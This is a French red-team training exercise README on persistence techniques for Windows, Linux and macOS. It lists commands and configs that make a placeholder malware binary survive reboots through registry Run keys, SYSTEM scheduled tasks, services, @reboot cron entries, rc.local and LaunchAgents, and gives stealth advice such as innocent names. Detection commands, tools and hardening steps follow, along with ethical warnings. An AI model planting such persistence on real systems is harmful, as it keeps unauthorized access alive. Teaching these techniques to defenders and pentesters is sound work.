# Exercice 25 - Techniques de Persistence

## Objectifs d'apprentissage
- Comprendre les mécanismes de persistence système
- Implémenter des techniques de survie au redémarrage
- Maîtriser les scheduled tasks et services
- Techniques multi-plateformes (Linux, Windows, macOS)
- Détection et suppression de mécanismes de persistence

## Avertissement Éthique Final

**DERNIER EXERCICE - ATTENTION MAXIMALE REQUISE**

Cet exercice conclut la formation en red teaming avec les techniques de persistence les plus sensibles. L'implémentation de persistence sans autorisation constitue une violation grave et prolongée de la sécurité.

**RAPPEL FINAL CRITIQUE:**

Ces techniques sont présentées pour:
- Compréhension des vecteurs d'attaque APT (Advanced Persistent Threat)
- Développement de solutions de détection EDR/XDR
- Formation en réponse aux incidents
- Hardening de systèmes contre persistence
- Tests de pénétration red team autorisés

**STRICTEMENT INTERDIT:**
- Installation de persistence sur systèmes sans autorisation
- Maintien d'accès non autorisé
- Utilisation en contexte malveillant
- Bypass de contrôles de sécurité sans permission

**RESPONSABILITÉ PROFESSIONNELLE:**

En tant que dernier exercice, celui-ci synthétise toutes les connaissances acquises. Votre compréhension de ces techniques vous rend professionnellement et légalement responsable de leur usage éthique.

## Concepts Clés

### Types de Persistence

```
Persistence Mechanisms:
├── System Boot Persistence
│   ├── Registry Run Keys (Windows)
│   ├── Startup Folder (Windows)
│   ├── rc.local / init.d (Linux)
│   ├── systemd services (Linux)
│   └── LaunchDaemons/Agents (macOS)
├── Scheduled Persistence
│   ├── Scheduled Tasks (Windows)
│   ├── Cron Jobs (Linux/macOS)
│   ├── At Jobs (Linux)
│   └── systemd timers (Linux)
├── Service-Based Persistence
│   ├── Windows Services
│   ├── systemd units
│   └── launchd services
├── User-Level Persistence
│   ├── .bashrc/.zshrc modification
│   ├── Login scripts
│   ├── Profile scripts
│   └── Shell initialization
└── Advanced Persistence
    ├── WMI Event Subscriptions
    ├── DLL Hijacking
    ├── Kernel modules
    └── Bootkit (BIOS/UEFI)
```

### Critères d'une Bonne Persistence

#### Furtivité
- Difficile à détecter par utilisateur
- Pas d'impact sur performance
- Noms innocents et légitimes
- Intégration avec processus système

#### Résilience
- Survie au redémarrage
- Résistance à suppression accidentelle
- Multiple points de persistence
- Auto-réparation si supprimée

#### Fiabilité
- Démarrage garanti
- Gestion d'erreurs robuste
- Pas de crash système
- Logging minimal

## Techniques par Plateforme

### Windows Persistence

#### Registry Run Keys
```powershell
# HKCU Run (User level)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdate" -Value "C:\Path\To\Malware.exe"

# HKLM Run (System level, requires admin)
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdate" -Value "C:\Path\To\Malware.exe"
```

#### Scheduled Tasks
```powershell
# Créer scheduled task
$Action = New-ScheduledTaskAction -Execute "C:\Path\To\Malware.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -TaskName "SystemMaintenance" -Action $Action -Trigger $Trigger -Principal $Principal
```

#### Windows Services
```powershell
# Créer service
New-Service -Name "SystemMonitor" -BinaryPathName "C:\Path\To\Malware.exe" -StartupType Automatic
```

### Linux Persistence

#### Systemd Service
```bash
# /etc/systemd/system/system-monitor.service
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/malware
Restart=always

[Install]
WantedBy=multi-user.target

# Enable service
systemctl enable system-monitor.service
systemctl start system-monitor.service
```

#### Cron Jobs
```bash
# System-wide cron
echo "@reboot /usr/local/bin/malware &" >> /etc/crontab

# User cron
(crontab -l ; echo "@reboot /home/user/.local/bin/malware &") | crontab -
```

#### rc.local
```bash
# /etc/rc.local
#!/bin/bash
/usr/local/bin/malware &
exit 0

chmod +x /etc/rc.local
```

### macOS Persistence

#### Launch Agents
```xml
<!-- ~/Library/LaunchAgents/com.system.agent.plist -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/malware</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
```

## Structure du Projet

```
25_persistence/
├── README.md
├── main.py
├── exercice.txt
└── solution.txt
```

## Prérequis
- Python 3.8+
- Modules: subprocess, platform, pathlib
- Connaissances systèmes multi-plateformes
- Compréhension services et scheduled tasks
- Environnement de test isolé

## Détection de Persistence

### Indicateurs Windows
```powershell
# Registry Run keys
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# Scheduled Tasks
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}

# Services
Get-Service | Where-Object {$_.StartType -eq "Automatic"}

# Startup Folder
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
```

### Indicateurs Linux
```bash
# Systemd services
systemctl list-unit-files --type=service --state=enabled

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# rc.local
cat /etc/rc.local

# Init scripts
ls -la /etc/init.d/
```

### Indicateurs macOS
```bash
# Launch Agents/Daemons
ls -la ~/Library/LaunchAgents/
ls -la /Library/LaunchAgents/
ls -la /Library/LaunchDaemons/

# Login Items
osascript -e 'tell application "System Events" to get the name of every login item'
```

## Outils de Détection

### Windows
- Autoruns (Sysinternals)
- Process Monitor
- Sysmon
- EDR solutions

### Linux
- systemd-analyze
- chkrootkit
- rkhunter
- AIDE (Advanced Intrusion Detection Environment)

### macOS
- KnockKnock
- BlockBlock
- LuLu
- Netiquette

## Ressources

### Documentation
- systemd: https://systemd.io/
- Windows Task Scheduler: Microsoft Docs
- launchd: Apple Developer Documentation

### Références Techniques
- MITRE ATT&CK: Persistence Techniques
- Red Team Operator Handbook
- APT persistence case studies
- Incident response playbooks

## Hardening et Défense

### Windows Hardening
```powershell
# Auditer Registry changes
auditpol /set /subcategory:"Registry" /success:enable /failure:enable

# Restreindre création scheduled tasks
# Via GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment

# Monitorer services
# Sysmon avec règles pour service creation
```

### Linux Hardening
```bash
# Auditer avec auditd
auditctl -w /etc/systemd/system/ -p wa -k persistence
auditctl -w /etc/crontab -p wa -k persistence
auditctl -w /etc/cron.d/ -p wa -k persistence

# Désactiver rc.local si non utilisé
systemctl mask rc-local.service

# Limiter qui peut créer cron jobs
echo "root" > /etc/cron.allow
```

## Considérations Légales Finales

**DERNIER RAPPEL:**

Vous avez maintenant les connaissances pour:
- Compromettre des systèmes
- Maintenir l'accès
- Évader les défenses
- Persister indéfiniment

**AVEC GRAND POUVOIR VIENT GRANDE RESPONSABILITÉ:**

- Utilisez UNIQUEMENT de manière éthique et légale
- Toujours avec autorisation écrite
- Dans le but d'améliorer la sécurité
- Jamais pour nuire ou compromettre

Votre réputation professionnelle et votre liberté dépendent de l'usage éthique de ces connaissances.

## Support Final

Félicitations pour avoir complété cette formation intensive en red teaming. Utilisez ces compétences pour:

- Tests de pénétration professionnels
- Amélioration de la sécurité
- Formation d'équipes de défense
- Contribution à la communauté de sécurité

Continuez à apprendre, pratiquez de manière éthique, et devenez un professionnel de la sécurité respecté.
